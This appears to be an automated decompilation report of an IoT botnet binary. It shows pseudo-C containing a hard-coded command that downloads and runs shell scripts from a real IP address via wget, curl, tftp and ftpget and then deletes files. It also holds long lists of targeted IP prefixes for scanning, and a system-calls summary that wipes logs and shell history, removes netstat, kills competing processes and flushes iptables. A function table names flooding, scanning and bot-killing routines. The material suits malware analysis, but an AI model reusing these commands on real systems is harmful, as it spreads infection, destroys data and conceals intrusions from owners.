    char (*v60)[703] = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n";

        szprintf(v150, (int32_t)"112.5.%d.%d", (int32_t)v142);

        szprintf(v151, (int32_t)"117.165.%d.%d", (int32_t)v142);

        szprintf(v152, (int32_t)"85.3.%d.%d", (int32_t)v142);

        szprintf(v153, (int32_t)"37.158.%d.%d", (int32_t)v142);

        szprintf(v154, (int32_t)"95.9.%d.%d", (int32_t)v142);

        szprintf(v155, (int32_t)"41.252.%d.%d", (int32_t)v142);

        szprintf(v156, (int32_t)"58.71.%d.%d", (int32_t)v142);

        szprintf(v157, (int32_t)"104.55.%d.%d", (int32_t)v142);

        szprintf(v158, (int32_t)"78.186.%d.%d", (int32_t)v142);

        szprintf(v159, (int32_t)"78.189.%d.%d", (int32_t)v142);

        szprintf(v160, (int32_t)"221.120.%d.%d", (int32_t)v142);

        szprintf(v161, (int32_t)"88.5.%d.%d", (int32_t)v142);

        szprintf(v162, (int32_t)"41.254.%d.%d", (int32_t)v142);

        szprintf(v163, (int32_t)"103.20.%d.%d", (int32_t)v142);

        szprintf(v164, (int32_t)"103.47.%d.%d", (int32_t)v142);

        szprintf(v165, (int32_t)"103.57.%d.%d", (int32_t)v142);

        szprintf(v166, (int32_t)"45.117.%d.%d", (int32_t)v142);

        szprintf(v167, (int32_t)"101.51.%d.%d", (int32_t)v142);

        szprintf(v168, (int32_t)"137.59.%d.%d", (int32_t)v142);

        szprintf(v169, (int32_t)"1.56.%d.%d", (int32_t)v142);

        szprintf(v170, (int32_t)"1.188.%d.%d", (int32_t)v142);

        szprintf(v171, (int32_t)"14.204.%d.%d", (int32_t)v142);

        szprintf(v172, (int32_t)"27.0.%d.%d", (int32_t)v142);

        szprintf(v173, (int32_t)"27.8.%d.%d", (int32_t)v142);

        szprintf(v174, (int32_t)"27.50.%d.%d", (int32_t)v142);

        szprintf(v175, (int32_t)"27.54.%d.%d", (int32_t)v142);

        szprintf(v176, (int32_t)"27.98.%d.%d", (int32_t)v142);

        szprintf(v177, (int32_t)"27.112.%d.%d", (int32_t)v142);

        szprintf(v178, (int32_t)"27.192.%d.%d", (int32_t)v142);

        szprintf(v179, (int32_t)"36.32.%d.%d", (int32_t)v142);

        szprintf(v180, (int32_t)"36.248.%d.%d", (int32_t)v142);

        szprintf(v181, (int32_t)"39.64.%d.%d", (int32_t)v142);

        szprintf(v182, (int32_t)"42.4.%d.%d", (int32_t)v142);

        szprintf(v183, (int32_t)"42.48.%d.%d", (int32_t)v142);

        szprintf(v184, (int32_t)"42.52.%d.%d", (int32_t)v142);

        szprintf(v185, (int32_t)"42.56.%d.%d", (int32_t)v142);

        szprintf(v186, (int32_t)"42.63.%d.%d", (int32_t)v142);

        szprintf(v187, (int32_t)"42.84.%d.%d", (int32_t)v142);

        szprintf(v188, (int32_t)"42.176.%d.%d", (int32_t)v142);

        szprintf(v189, (int32_t)"42.224.%d.%d", (int32_t)v142);

        szprintf(v190, (int32_t)"42.176.%d.%d", (int32_t)v142);

        szprintf(v191, (int32_t)"43.253.%d.%d", (int32_t)v142);

        szprintf(v192, (int32_t)"43.230.%d.%d", (int32_t)v142);

        szprintf(v193, (int32_t)"163.53.%d.%d", (int32_t)v142);

        szprintf(v194, (int32_t)"43.230.%d.%d", (int32_t)v142);

        szprintf(v195, (int32_t)"62.252.%d.%d", (int32_t)v142);

        szprintf(v196, (int32_t)"43.245.%d.%d", (int32_t)v142);

        szprintf(v197, (int32_t)"62.255.%d.%d", (int32_t)v142);

        szprintf(v198, (int32_t)"123.25.%d.%d", (int32_t)v142);

        szprintf(v199, (int32_t)"103.54.%d.%d", (int32_t)v142);

        szprintf(v200, (int32_t)"27.255.%d.%d", (int32_t)v142);

        szprintf(v201, (int32_t)"103.204.%d.%d", (int32_t)v142);

        szprintf(v202, (int32_t)"123.24.%d.%d", (int32_t)v142);

        szprintf(v203, (int32_t)"113.191.%d.%d", (int32_t)v142);

        szprintf(v204, (int32_t)"81.100.%d.%d", (int32_t)v142);

        szprintf(v205, (int32_t)"113.188.%d.%d", (int32_t)v142);

        szprintf(v206, (int32_t)"113.189.%d.%d", (int32_t)v142);

        szprintf(v207, (int32_t)"94.174.%d.%d", (int32_t)v142);

        szprintf(v208, (int32_t)"14.160.%d.%d", (int32_t)v142);

        szprintf(v209, (int32_t)"14.161.%d.%d", (int32_t)v142);

        szprintf(v210, (int32_t)"14.162.%d.%d", (int32_t)v142);

        szprintf(v211, (int32_t)"14.163.%d.%d", (int32_t)v142);

        szprintf(v212, (int32_t)"14.164.%d.%d", (int32_t)v142);

        szprintf(v213, (int32_t)"14.165.%d.%d", (int32_t)v142);

        szprintf(v214, (int32_t)"14.166.%d.%d", (int32_t)v142);

        szprintf(v215, (int32_t)"14.167.%d.%d", (int32_t)v142);

        szprintf(v216, (int32_t)"14.168.%d.%d", (int32_t)v142);

        szprintf(v217, (int32_t)"14.169.%d.%d", (int32_t)v142);

        szprintf(v218, (int32_t)"14.170.%d.%d", (int32_t)v142);

        szprintf(v219, (int32_t)"14.171.%d.%d", (int32_t)v142);

        szprintf(v220, (int32_t)"14.172.%d.%d", (int32_t)v142);

        szprintf(v221, (int32_t)"14.173.%d.%d", (int32_t)v142);

        szprintf(v222, (int32_t)"14.174.%d.%d", (int32_t)v142);

        szprintf(v223, (int32_t)"14.175.%d.%d", (int32_t)v142);

        szprintf(v224, (int32_t)"14.176.%d.%d", (int32_t)v142);

        szprintf(v225, (int32_t)"14.177.%d.%d", (int32_t)v142);

        szprintf(v226, (int32_t)"14.178.%d.%d", (int32_t)v142);

        szprintf(v227, (int32_t)"14.179.%d.%d", (int32_t)v142);

        szprintf(v228, (int32_t)"14.180.%d.%d", (int32_t)v142);

        szprintf(v229, (int32_t)"14.181.%d.%d", (int32_t)v142);

        szprintf(v230, (int32_t)"14.182.%d.%d", (int32_t)v142);

        szprintf(v231, (int32_t)"14.183.%d.%d", (int32_t)v142);

        szprintf(v232, (int32_t)"14.184.%d.%d", (int32_t)v142);

        szprintf(v233, (int32_t)"14.185.%d.%d", (int32_t)v142);

        szprintf(v234, (int32_t)"14.186.%d.%d", (int32_t)v142);

        szprintf(v235, (int32_t)"14.187.%d.%d", (int32_t)v142);

        szprintf(v236, (int32_t)"14.188.%d.%d", (int32_t)v142);

        szprintf(v237, (int32_t)"14.189.%d.%d", (int32_t)v142);

        szprintf(v238, (int32_t)"14.190.%d.%d", (int32_t)v142);

        szprintf(v239, (int32_t)"14.191.%d.%d", (int32_t)v142);

        szprintf(v240, (int32_t)"45.121.%d.%d", (int32_t)v142);

        szprintf(v241, (int32_t)"45.120.%d.%d", (int32_t)v142);

        szprintf(v242, (int32_t)"45.115.%d.%d", (int32_t)v142);

        szprintf(v243, (int32_t)"43.252.%d.%d", (int32_t)v142);

        szprintf(v244, (int32_t)"43.230.%d.%d", (int32_t)v142);

        szprintf(v245, (int32_t)"43.240.%d.%d", (int32_t)v142);

        szprintf(v246, (int32_t)"43.245.%d.%d", (int32_t)v142);

        szprintf(v247, (int32_t)"41.174.%d.%d", (int32_t)v142);

        szprintf(v248, (int32_t)"49.118.%d.%d", (int32_t)v142);

        szprintf(v249, (int32_t)"78.188.%d.%d", (int32_t)v142);

        szprintf(v250, (int32_t)"45.127.%d.%d", (int32_t)v142);

        szprintf(v251, (int32_t)"103.30.%d.%d", (int32_t)v142);

        szprintf(v252, (int32_t)"14.33.%d.%d", (int32_t)v142);

        szprintf(v253, (int32_t)"123.16.%d.%d", (int32_t)v142);

        szprintf(v254, (int32_t)"202.44.%d.%d", (int32_t)v142);

        szprintf(v255, (int32_t)"116.93.%d.%d", (int32_t)v142);

        szprintf(v256, (int32_t)"91.83.%d.%d", (int32_t)v142);

        szprintf(v257, (int32_t)"41.253.%d.%d", (int32_t)v142);

        szprintf(v258, (int32_t)"117.173.%d.%d", (int32_t)v142);

        szprintf(v259, (int32_t)"113.190.%d.%d", (int32_t)v142);

        szprintf(v260, (int32_t)"146.88.%d.%d", (int32_t)v142);

        szprintf(v261, (int32_t)"112.196.%d.%d", (int32_t)v142);

        szprintf(v262, (int32_t)"113.178.%d.%d", (int32_t)v142);

        szprintf(v263, (int32_t)"112.45.%d.%d", (int32_t)v142);

        szprintf(v264, (int32_t)"183.223.%d.%d", (int32_t)v142);

        szprintf(v265, (int32_t)"116.71.%d.%d", (int32_t)v142);

        szprintf(v266, (int32_t)"103.44.%d.%d", (int32_t)v142);

        szprintf(v267, (int32_t)"110.235.%d.%d", (int32_t)v142);

        szprintf(v268, (int32_t)"124.253.%d.%d", (int32_t)v142);

        szprintf(v269, (int32_t)"211.237.%d.%d", (int32_t)v142);

        szprintf(v270, (int32_t)"117.175.%d.%d", (int32_t)v142);

        szprintf(v271, (int32_t)"117.173.%d.%d", (int32_t)v142);

        szprintf(v272, (int32_t)"178.93.%d.%d", (int32_t)v142);

        szprintf(v273, (int32_t)"111.9.%d.%d", (int32_t)v142);

        szprintf(v274, (int32_t)"222.252.%d.%d", (int32_t)v142);

        szprintf(v275, (int32_t)"113.174.%d.%d", (int32_t)v142);

        szprintf(v276, (int32_t)"222.252.%d.%d", (int32_t)v142);

        szprintf(v277, (int32_t)"113.160.%d.%d", (int32_t)v142);

        szprintf(v278, (int32_t)"113.161.%d.%d", (int32_t)v142);

        szprintf(v279, (int32_t)"113.162.%d.%d", (int32_t)v142);

        szprintf(v280, (int32_t)"113.163.%d.%d", (int32_t)v142);

        szprintf(v281, (int32_t)"113.164.%d.%d", (int32_t)v142);

        szprintf(v282, (int32_t)"113.165.%d.%d", (int32_t)v142);

        szprintf(v283, (int32_t)"113.166.%d.%d", (int32_t)v142);

        szprintf(v284, (int32_t)"113.167.%d.%d", (int32_t)v142);

        szprintf(v285, (int32_t)"113.168.%d.%d", (int32_t)v142);

        szprintf(v286, (int32_t)"113.169.%d.%d", (int32_t)v142);

        szprintf(v287, (int32_t)"123.17.%d.%d", (int32_t)v142);

        szprintf(v288, (int32_t)"123.18.%d.%d", (int32_t)v142);

        szprintf(v289, (int32_t)"123.19.%d.%d", (int32_t)v142);

        szprintf(v290, (int32_t)"123.20.%d.%d", (int32_t)v142);

        szprintf(v291, (int32_t)"123.21.%d.%d", (int32_t)v142);

        szprintf(v292, (int32_t)"123.22.%d.%d", (int32_t)v142);

        szprintf(v293, (int32_t)"222.252.%d.%d", (int32_t)v142);

        szprintf(v294, (int32_t)"222.253.%d.%d", (int32_t)v142);

        szprintf(v295, (int32_t)"222.254.%d.%d", (int32_t)v142);

        szprintf(v296, (int32_t)"222.255.%d.%d", (int32_t)v142);

        szprintf(v297, (int32_t)"37.247.%d.%d", (int32_t)v142);

        szprintf(v298, (int32_t)"41.208.%d.%d", (int32_t)v142);

        szprintf(v299, (int32_t)"183.220.%d.%d", (int32_t)v142);

        szprintf(v300, (int32_t)"175.201.%d.%d", (int32_t)v142);

        szprintf(v301, (int32_t)"103.198.%d.%d", (int32_t)v142);

        szprintf(v302, (int32_t)"183.223.%d.%d", (int32_t)v142);

        szprintf(v303, (int32_t)"50.205.%d.%d", (int32_t)v142);

        szprintf(v304, (int32_t)"88.248.%d.%d", (int32_t)v142);

        szprintf(v305, (int32_t)"88.105.%d.%d", (int32_t)v142);

        szprintf(v306, (int32_t)"88.247.%d.%d", (int32_t)v142);

        szprintf(v307, (int32_t)"85.105.%d.%d", (int32_t)v142);

        szprintf(v308, (int32_t)"188.3.%d.%d", (int32_t)v142);

        szprintf(v309, (int32_t)"103.203.%d.%d", (int32_t)v142);

        szprintf(v310, (int32_t)"103.55.%d.%d", (int32_t)v142);

        szprintf(v311, (int32_t)"103.220.%d.%d", (int32_t)v142);

        szprintf(v312, (int32_t)"183.233.%d.%d", (int32_t)v142);

        szprintf(v313, (int32_t)"103.242.%d.%d", (int32_t)v142);

        szprintf(v314, (int32_t)"103.198.%d.%d", (int32_t)v142);

        szprintf(v315, (int32_t)"103.14.%d.%d", (int32_t)v142);

        szprintf(v316, (int32_t)"103.195.%d.%d", (int32_t)v142);

        szprintf(v317, (int32_t)"103.203.%d.%d", (int32_t)v142);

        szprintf(v318, (int32_t)"103.214.%d.%d", (int32_t)v142);

        szprintf(v319, (int32_t)"103.218.%d.%d", (int32_t)v142);

        szprintf(v320, (int32_t)"103.225.%d.%d", (int32_t)v142);

        szprintf(v321, (int32_t)"103.228.%d.%d", (int32_t)v142);

        szprintf(v322, (int32_t)"103.231.%d.%d", (int32_t)v142);

        szprintf(v323, (int32_t)"103.60.%d.%d", (int32_t)v142);

        szprintf(v324, (int32_t)"103.248.%d.%d", (int32_t)v142);

        szprintf(v325, (int32_t)"103.253.%d.%d", (int32_t)v142);

        szprintf(v326, (int32_t)"103.255.%d.%d", (int32_t)v142);

        szprintf(v327, (int32_t)"103.35.%d.%d", (int32_t)v142);

        szprintf(v328, (int32_t)"103.49.%d.%d", (int32_t)v142);

        szprintf(v329, (int32_t)"103.62.%d.%d", (int32_t)v142);

        szprintf(v330, (int32_t)"144.48.%d.%d", (int32_t)v142);

        szprintf(v331, (int32_t)"163.47.%d.%d", (int32_t)v142);

        szprintf(v332, (int32_t)"163.53.%d.%d", (int32_t)v142);

        szprintf(v333, (int32_t)"223.29.%d.%d", (int32_t)v142);

        szprintf(v334, (int32_t)"59.153.%d.%d", (int32_t)v142);

        szprintf(v335, (int32_t)"113.176.%d.%d", (int32_t)v142);

        szprintf(v336, (int32_t)"113.175.%d.%d", (int32_t)v142);

        szprintf(v337, (int32_t)"113.177.%d.%d", (int32_t)v142);

        szprintf(v338, (int32_t)"113.183.%d.%d", (int32_t)v142);

        szprintf(v339, (int32_t)"202.164.%d.%d", (int32_t)v142);

        szprintf(v340, (int32_t)"203.134.%d.%d", (int32_t)v142);

        szprintf(v341, (int32_t)"210.56.%d.%d", (int32_t)v142);

        szprintf(v342, (int32_t)"49.156.%d.%d", (int32_t)v142);

        szprintf(v343, (int32_t)"203.210.%d.%d", (int32_t)v142);

        szprintf(v344, (int32_t)"117.181.%d.%d", (int32_t)v142);

        szprintf(v345, (int32_t)"117.178.%d.%d", (int32_t)v142);

        szprintf(v346, (int32_t)"117.177.%d.%d", (int32_t)v142);

        szprintf(v347, (int32_t)"117.176.%d.%d", (int32_t)v142);

        szprintf(v348, (int32_t)"117.170.%d.%d", (int32_t)v142);

        szprintf(v349, (int32_t)"117.171.%d.%d", (int32_t)v142);

        szprintf(v350, (int32_t)"117.162.%d.%d", (int32_t)v142);

        szprintf(v350, (int32_t)"112.26.%d.%d", (int32_t)v142);

        szprintf(v351, (int32_t)"112.27.%d.%d", (int32_t)v142);

        szprintf(v352, (int32_t)"112.28.%d.%d", (int32_t)v142);

        szprintf(v353, (int32_t)"112.29.%d.%d", (int32_t)v142);

        szprintf(v354, (int32_t)"112.30.%d.%d", (int32_t)v142);

        szprintf(v355, (int32_t)"112.31.%d.%d", (int32_t)v142);

        szprintf(v356, (int32_t)"203.150.%d.%d", (int32_t)v142);

    szprintf(v148, (int32_t)"%d.%d.%d.%d", (int32_t)v149);

        sprintf(v147, (int32_t)"%s cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n x00");

    return __libc_system((int32_t)"cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n");

        inet_addr((int32_t)"8.8.8.8");

================================================================================
========	SYSTEM CALLS SUMMARY : ================================================
================================================================================
    return __libc_system((int32_t)"cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n");

        __libc_system(v149);

        result = __libc_system(v156);

    __libc_system((int32_t)"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*");

    __libc_system((int32_t)"rm -rf /var/log/wtmp");

    __libc_system((int32_t)"history -c;history -w");

    __libc_system((int32_t)"rm -rf /var/log/wtmp");

    __libc_system((int32_t)"rm -rf /tmp/*");

    __libc_system((int32_t)"history -c");

    __libc_system((int32_t)"rm -rf ~/.bash_history");

    __libc_system((int32_t)"rm -rf /bin/netstat");

    __libc_system((int32_t)"history -w");

    __libc_system((int32_t)"pkill -9 busybox");

    __libc_system((int32_t)"pkill -9 perl");

    __libc_system((int32_t)"service iptables stop");

    return __libc_system((int32_t)"/sbin/iptables -F;/sbin/iptables -X");

int32_t __libc_system(int32_t a1) {

================================================================================
========	FUNCTIONS LIST : =======================================================
================================================================================
FUNCTION_NAME                                     |ARGS|LENGH   |SUSPCET_INSTRC|WHILE_INSTRC|
----------------------------------------------------------------------------------------------
processCmd                                        |2   |10182   |968           |1736        |
----------------------------------------------------------------------------------------------
HackerScan2                                       |1   |1406    |214           |0           |
----------------------------------------------------------------------------------------------
sysconf                                           |1   |926     |136           |0           |
----------------------------------------------------------------------------------------------
__dns_lookup                                      |6   |1080    |64            |746         |
----------------------------------------------------------------------------------------------
main                                              |0   |604     |53            |383         |
----------------------------------------------------------------------------------------------
_fpmaxtostr                                       |0   |3541    |50            |3267        |
----------------------------------------------------------------------------------------------
fdpopen                                           |2   |449     |38            |0           |
----------------------------------------------------------------------------------------------
_init                                             |0   |778     |35            |0           |
----------------------------------------------------------------------------------------------
gethostbyname_r                                   |8   |571     |33            |0           |
----------------------------------------------------------------------------------------------
sendTCP                                           |7   |466     |32            |174         |
----------------------------------------------------------------------------------------------
StartTheLelz                                      |1   |731     |30            |570         |
----------------------------------------------------------------------------------------------
malloc                                            |1   |3485    |30            |2111        |
----------------------------------------------------------------------------------------------
prints                                            |4   |462     |28            |28          |
----------------------------------------------------------------------------------------------
__read_etc_hosts_r                                |9   |667     |25            |289         |
----------------------------------------------------------------------------------------------
sendUDP                                           |6   |355     |24            |67          |
----------------------------------------------------------------------------------------------
_ppfs_parsespec                                   |1   |1050    |20            |881         |
----------------------------------------------------------------------------------------------
__open_nameservers                                |0   |532     |20            |253         |
----------------------------------------------------------------------------------------------
getOurIP                                          |0   |242     |16            |48          |
----------------------------------------------------------------------------------------------
sendJUNK                                          |3   |322     |14            |146         |
----------------------------------------------------------------------------------------------
_stdio_fopen                                      |4   |939     |13            |0           |
----------------------------------------------------------------------------------------------
RemoveTMP                                         |0   |158     |13            |0           |
----------------------------------------------------------------------------------------------
sendHOLD                                          |3   |298     |12            |124         |
----------------------------------------------------------------------------------------------
getBogos                                          |1   |215     |10            |60          |
----------------------------------------------------------------------------------------------
print                                             |3   |412     |9             |251         |
----------------------------------------------------------------------------------------------
__uClibc_main                                     |8   |704     |9             |19          |
----------------------------------------------------------------------------------------------
printi                                            |7   |261     |8             |21          |
----------------------------------------------------------------------------------------------
getCores                                          |0   |175     |8             |17          |
----------------------------------------------------------------------------------------------
__GI_inet_ntop                                    |4   |516     |8             |342         |
----------------------------------------------------------------------------------------------
sendHTTP                                          |6   |197     |8             |38          |
----------------------------------------------------------------------------------------------
negotiate                                         |3   |198     |7             |0           |
----------------------------------------------------------------------------------------------
sendSTD                                           |3   |184     |7             |24          |
----------------------------------------------------------------------------------------------
fdpclose                                          |1   |199     |6             |24          |
----------------------------------------------------------------------------------------------
sleep                                             |1   |246     |6             |94          |
----------------------------------------------------------------------------------------------
recvLine                                          |3   |266     |6             |83          |
----------------------------------------------------------------------------------------------
NetisRanges                                       |1   |154     |6             |0           |
----------------------------------------------------------------------------------------------
memrchr                                           |3   |322     |6             |124         |
----------------------------------------------------------------------------------------------
StartTheNetis                                     |0   |160     |5             |9           |
----------------------------------------------------------------------------------------------
inet_pton                                         |4   |429     |5             |239         |
----------------------------------------------------------------------------------------------
srandom_r                                         |2   |220     |5             |38          |
----------------------------------------------------------------------------------------------
sendCNC                                           |3   |161     |4             |0           |
----------------------------------------------------------------------------------------------
readUntil                                         |8   |231     |4             |77          |
----------------------------------------------------------------------------------------------
socket_connect                                    |2   |171     |4             |0           |
----------------------------------------------------------------------------------------------
strstr                                            |2   |284     |4             |121         |
----------------------------------------------------------------------------------------------
trim                                              |1   |208     |4             |59          |
----------------------------------------------------------------------------------------------
_stdlib_strto_l                                   |4   |499     |4             |101         |
----------------------------------------------------------------------------------------------
botkiller                                         |0   |176     |4             |0           |
----------------------------------------------------------------------------------------------
abort                                             |0   |222     |4             |74          |
----------------------------------------------------------------------------------------------
listFork                                          |0   |176     |3             |17          |
----------------------------------------------------------------------------------------------
hostname_to_ip                                    |2   |165     |3             |0           |
----------------------------------------------------------------------------------------------
connectTimeout                                    |4   |195     |3             |0           |
----------------------------------------------------------------------------------------------
HackerPrint                                       |2   |154     |3             |0           |
----------------------------------------------------------------------------------------------
__GI_fclose                                       |1   |192     |3             |0           |
----------------------------------------------------------------------------------------------
fflush_unlocked                                   |1   |250     |3             |58          |
----------------------------------------------------------------------------------------------
initConnection                                    |0   |178     |3             |0           |
----------------------------------------------------------------------------------------------
__GI_vfprintf                                     |4   |189     |2             |0           |
----------------------------------------------------------------------------------------------
__GI_strpbrk                                      |4   |208     |2             |49          |
----------------------------------------------------------------------------------------------
__libc_system                                     |1   |188     |2             |0           |
----------------------------------------------------------------------------------------------
__GI_herror                                       |1   |184     |2             |0           |
----------------------------------------------------------------------------------------------
_uintmaxtostr                                     |5   |253     |2             |41          |
----------------------------------------------------------------------------------------------
_vfprintf_internal                                |3   |793     |2             |628         |
----------------------------------------------------------------------------------------------
_stdio_term                                       |0   |197     |2             |31          |
----------------------------------------------------------------------------------------------
inet_aton                                         |2   |251     |2             |94          |
----------------------------------------------------------------------------------------------
__decode_dotted                                   |4   |235     |2             |66          |
----------------------------------------------------------------------------------------------
__GI_initstate_r                                  |4   |184     |2             |0           |
----------------------------------------------------------------------------------------------
makeRandomStr                                     |2   |160     |2             |0           |
----------------------------------------------------------------------------------------------
_stdio_openlist_dec_use                           |0   |215     |2             |37          |
----------------------------------------------------------------------------------------------
__open_etc_hosts                                  |0   |156     |2             |0           |
----------------------------------------------------------------------------------------------
strcasestr                                        |2   |217     |2             |61          |
----------------------------------------------------------------------------------------------
__GI_wcsnrtombs                                   |5   |272     |2             |47          |
----------------------------------------------------------------------------------------------
contains_string                                   |2   |178     |2             |16          |
----------------------------------------------------------------------------------------------
__GI_strspn                                       |4   |201     |2             |45          |
----------------------------------------------------------------------------------------------
matchPrompt                                       |1   |203     |2             |52          |
----------------------------------------------------------------------------------------------
__malloc_consolidate                              |1   |292     |2             |122         |
----------------------------------------------------------------------------------------------
__stdio_WRITE                                     |4   |220     |2             |67          |
----------------------------------------------------------------------------------------------
__GI_fgets_unlocked                               |4   |224     |2             |60          |
----------------------------------------------------------------------------------------------
__GI_sigprocmask                                  |4   |183     |2             |0           |
----------------------------------------------------------------------------------------------
rawmemchr                                         |4   |239     |2             |25          |
----------------------------------------------------------------------------------------------
_ppfs_setargs                                     |1   |309     |1             |81          |
----------------------------------------------------------------------------------------------
kill                                              |2   |158     |1             |0           |
----------------------------------------------------------------------------------------------
_fini                                             |0   |148     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_strcasecmp                                   |4   |176     |1             |28          |
----------------------------------------------------------------------------------------------
getdtablesize                                     |1   |153     |1             |0           |
----------------------------------------------------------------------------------------------
get_telstate_host                                 |0   |147     |1             |0           |
----------------------------------------------------------------------------------------------
__vfork                                           |1   |147     |1             |0           |
----------------------------------------------------------------------------------------------
getHost                                           |2   |147     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_getpid                                     |0   |158     |1             |0           |
----------------------------------------------------------------------------------------------
__raise                                           |1   |146     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_setsockopt                                   |5   |145     |1             |0           |
----------------------------------------------------------------------------------------------
rand                                              |0   |146     |1             |0           |
----------------------------------------------------------------------------------------------
fgets                                             |3   |167     |1             |0           |
----------------------------------------------------------------------------------------------
__bsd_signal                                      |2   |193     |1             |27          |
----------------------------------------------------------------------------------------------
makeIPPacket                                      |0   |151     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_inet_ntoa                                    |1   |146     |1             |0           |
----------------------------------------------------------------------------------------------
inet_pton4                                        |3   |225     |1             |55          |
----------------------------------------------------------------------------------------------
__libc_sendto                                     |6   |145     |1             |0           |
----------------------------------------------------------------------------------------------
_charpad                                          |0   |177     |1             |21          |
----------------------------------------------------------------------------------------------
isatty                                            |1   |146     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_strcoll                                      |4   |172     |1             |20          |
----------------------------------------------------------------------------------------------
__GI_snprintf                                     |6   |147     |1             |0           |
----------------------------------------------------------------------------------------------
__encode_dotted                                   |7   |222     |1             |47          |
----------------------------------------------------------------------------------------------
parseHex                                          |1   |173     |1             |18          |
----------------------------------------------------------------------------------------------
__get_hosts_byname_r                              |7   |146     |1             |0           |
----------------------------------------------------------------------------------------------
szprintf                                          |3   |147     |1             |0           |
----------------------------------------------------------------------------------------------
tcpcsum                                           |0   |149     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_strncat                                      |0   |182     |1             |18          |
----------------------------------------------------------------------------------------------
sprintf                                           |2   |147     |1             |0           |
----------------------------------------------------------------------------------------------
__length_dotted                                   |2   |187     |1             |22          |
----------------------------------------------------------------------------------------------
read_with_timeout                                 |4   |159     |1             |0           |
----------------------------------------------------------------------------------------------
strncpy                                           |3   |175     |1             |18          |
----------------------------------------------------------------------------------------------
strnlen                                           |0   |175     |1             |18          |
----------------------------------------------------------------------------------------------
__libc_recv                                       |4   |145     |1             |0           |
----------------------------------------------------------------------------------------------
csum                                              |2   |270     |1             |19          |
----------------------------------------------------------------------------------------------
__libc_fork                                       |1   |158     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_open                                       |2   |162     |1             |0           |
----------------------------------------------------------------------------------------------
inet_addr                                         |1   |153     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_clock_getres                                 |5   |157     |1             |0           |
----------------------------------------------------------------------------------------------
wait4                                             |4   |160     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_creat                                      |2   |146     |1             |0           |
----------------------------------------------------------------------------------------------
__check_one_fd                                    |0   |160     |1             |0           |
----------------------------------------------------------------------------------------------
fprintf                                           |5   |148     |1             |0           |
----------------------------------------------------------------------------------------------
getsockopt                                        |5   |145     |1             |0           |
----------------------------------------------------------------------------------------------
random                                            |0   |153     |1             |0           |
----------------------------------------------------------------------------------------------
zprintf                                           |1   |146     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_connect                                    |3   |145     |1             |0           |
----------------------------------------------------------------------------------------------
LoopPayload                                       |0   |146     |1             |0           |
----------------------------------------------------------------------------------------------
srand                                             |1   |151     |1             |0           |
----------------------------------------------------------------------------------------------
sclose                                            |1   |154     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_inet_ntoa_r                                  |2   |170     |1             |17          |
----------------------------------------------------------------------------------------------
__libc_send                                       |4   |145     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_gethostbyname                                |1   |149     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_close                                      |1   |157     |1             |0           |
----------------------------------------------------------------------------------------------
